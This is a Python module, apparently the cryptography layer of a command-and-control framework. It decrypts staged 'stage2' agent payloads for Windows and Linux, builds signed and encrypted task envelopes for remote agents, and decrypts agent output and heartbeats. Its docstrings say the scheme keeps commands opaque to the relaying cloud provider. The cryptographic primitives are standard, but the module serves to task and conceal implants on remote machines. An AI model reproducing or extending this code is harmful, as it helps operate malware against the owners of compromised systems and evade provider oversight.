# providers/_crypto.py
# Cryptographic primitives: RSA-OAEP, AES-256-GCM, stage2 decrypt, task building.
# No imports from other providers.* internal modules.

import base64
import hashlib
import json
import os
from pathlib import Path
from typing import Optional

from cryptography.hazmat.primitives.asymmetric import padding as _asym_padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.ciphers import Cipher as _Cipher, algorithms as _alg, modes as _modes
from cryptography.hazmat.backends import default_backend as _default_backend
from cryptography.hazmat.primitives import hashes as _hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.padding import PKCS7 as _PKCS7
from cryptography.hazmat.primitives.serialization import (
    Encoding, PublicFormat,
    load_pem_private_key as _load_pem_private_key,
)

_OAEP = _asym_padding.OAEP(
    mgf       = _asym_padding.MGF1(_hashes.SHA256()),
    algorithm = _hashes.SHA256(),
    label     = None,
)
_PSS = _asym_padding.PSS(
    mgf         = _asym_padding.MGF1(_hashes.SHA256()),
    salt_length = 32,  # hLen=32 — matches rsa 0.9 VerifyingKey default
)

# Sentinel value that means "no data yet"; mirrored from _session.MZ_MARKER to
# avoid a circular import (_session imports nothing from _crypto).
_MZ = "MZ"


def _rsa_oaep_decrypt(priv_pem_or_file: str, data: bytes,
                      key_password: Optional[bytes] = None) -> bytes:
    """RSA-OAEP-SHA256 decrypt with the deployment private key (PEM path)."""
    pem = Path(priv_pem_or_file).read_bytes()
    return _load_pem_private_key(pem, password=key_password).decrypt(data, _OAEP)


def _gcm_seal(key: bytes, plaintext: bytes) -> bytes:
    """AES-256-GCM seal. Returns nonce(12) || ciphertext || tag(16)."""
    nonce = os.urandom(12)
    return nonce + AESGCM(key).encrypt(nonce, plaintext, None)


def _gcm_open(key: bytes, blob: bytes) -> bytes:
    """AES-256-GCM open. Expects nonce(12) || ciphertext || tag(16). Raises on auth failure."""
    if len(blob) < 28:
        raise ValueError("GCM blob too short")
    return AESGCM(key).decrypt(blob[:12], blob[12:], None)


_OPENSSL_MAGIC = b"Salted__"
_GCM_PREFIX    = "SGCM:"


def _decrypt_stage2_gcm(blob_b64: str, bk: str) -> Optional[str]:
    """Decrypt SGCM wire format: salt[8] + nonce[12] + ciphertext + tag[16]."""
    try:
        raw   = base64.b64decode(blob_b64)
        if len(raw) < 36:   # 8 + 12 + 16 minimum
            return None
        salt, nonce, ct_tag = raw[:8], raw[8:20], raw[20:]
        dk    = PBKDF2HMAC(algorithm=_hashes.SHA256(), length=32, salt=salt, iterations=210_000
                           ).derive(bk.encode())
        plain = AESGCM(dk).decrypt(nonce, ct_tag, None).decode()
        return plain[8:] if plain.startswith("STRATUM:") else None
    except Exception:
        return None


def _decrypt_stage2_cbc(raw: bytes, bk: str) -> Optional[str]:
    """Decrypt legacy CBC wire format (backward compat for existing deploys)."""
    try:
        if len(raw) < 16 or raw[:8] != _OPENSSL_MAGIC:
            return None
        salt  = raw[8:16]
        ct    = raw[16:]
        dk    = PBKDF2HMAC(algorithm=_hashes.SHA256(), length=48, salt=salt, iterations=210_000
                           ).derive(bk.encode())
        key, iv = dk[:32], dk[32:48]
        dec   = _Cipher(_alg.AES(key), _modes.CBC(iv), backend=_default_backend()).decryptor()
        padded = dec.update(ct) + dec.finalize()
        plain  = _PKCS7(128).unpadder()
        plain  = (plain.update(padded) + plain.finalize()).decode()
        return plain[8:] if plain.startswith("STRATUM:") else None
    except Exception:
        return None


def decrypt_stage2(deploy_dir: Path, bk: str, os_hint: str = "windows") -> Optional[str]:
    """Decrypt stage2 agent code from local deployment folder. Returns plaintext or None.

    Supports both GCM (new, SGCM: prefix) and CBC (legacy, Salted__ magic).
    """
    name = "stage2_win.enc" if "windows" in os_hint.lower() else "stage2_linux.enc"
    f = deploy_dir / "agent" / name
    if not f.exists():
        return None
    try:
        text = f.read_text().strip()
        if text.startswith(_GCM_PREFIX):
            return _decrypt_stage2_gcm(text[len(_GCM_PREFIX):], bk)
        return _decrypt_stage2_cbc(base64.b64decode(text), bk)
    except Exception:
        return None


def deploy_id_from_key(private_key_file: str,
                       key_password: Optional[bytes] = None) -> Optional[str]:
    """Derive the 16-char hex deploy ID from the deployment private key."""
    try:
        priv_pem = Path(private_key_file).read_bytes()
        priv_key = _load_pem_private_key(priv_pem, password=key_password)
        pub_pem  = priv_key.public_key().public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
        return hashlib.sha256(pub_pem).hexdigest()[:16]
    except Exception:
        return None


def build_task(cmd_id: str, task_type: str, args: dict,
               expires_at: Optional[float] = None,
               session_token: str = "") -> str:
    """Build a JSON task envelope as a compact string (plaintext before encryption)."""
    envelope: dict = {"id": cmd_id, "type": task_type, "args": args}
    if expires_at is not None:
        envelope["expires_at"] = expires_at
    if session_token:
        envelope["session_token"] = session_token
    return json.dumps(envelope, ensure_ascii=False, separators=(',', ':'))


def encrypt_command(task_json: str, key_file: str, session_key_hex: str,
                    key_password: Optional[bytes] = None) -> str:
    """Seal a command for delivery to the agent.

    Protocol (server → agent):
      payload = base64(GCM(session_key, aes_key)) : base64(nonce||ct||tag) : base64(PSS_sig)
      where PSS_sig = RSA-PSS-SHA256(priv_key, sha256(wrapped_aes || blob))

    aes_key is GCM-wrapped with the pre-shared session_key so the cloud provider
    sees only opaque ciphertext.  PSS authenticates the entire payload.
    The agent unwraps aes_key with session_key before GCM-decrypting the command.
    """
    priv_key    = _load_pem_private_key(Path(key_file).read_bytes(), password=key_password)
    aes_key     = os.urandom(32)
    blob        = _gcm_seal(aes_key, task_json.encode())
    session_key = bytes.fromhex(session_key_hex)
    wrapped_aes = _gcm_seal(session_key, aes_key)
    sig         = priv_key.sign(wrapped_aes + blob, _PSS, _hashes.SHA256())
    return (base64.b64encode(wrapped_aes).decode() + ":"
            + base64.b64encode(blob).decode() + ":"
            + base64.b64encode(sig).decode())


def decrypt_output(raw: str, key_file: str,
                   key_password: Optional[bytes] = None) -> Optional[str]:
    """Decrypt agent output or heartbeat.

    Protocol (agent → server):
      payload = base64(RSA-OAEP-wrapped aes_key) : base64(nonce||ct||tag)

    The agent encrypts aes_key with the embedded public key; only the server
    (private key) can unwrap it.  GCM provides integrity.
    """
    if not raw or raw == _MZ:
        return ""
    try:
        wrapped_b64, blob_b64 = raw.split(":", 1)
        aes_key = _rsa_oaep_decrypt(key_file, base64.b64decode(wrapped_b64), key_password)
        plain   = _gcm_open(aes_key, base64.b64decode(blob_b64))
        return plain.decode("utf-8", errors="replace")
    except Exception:
        return None
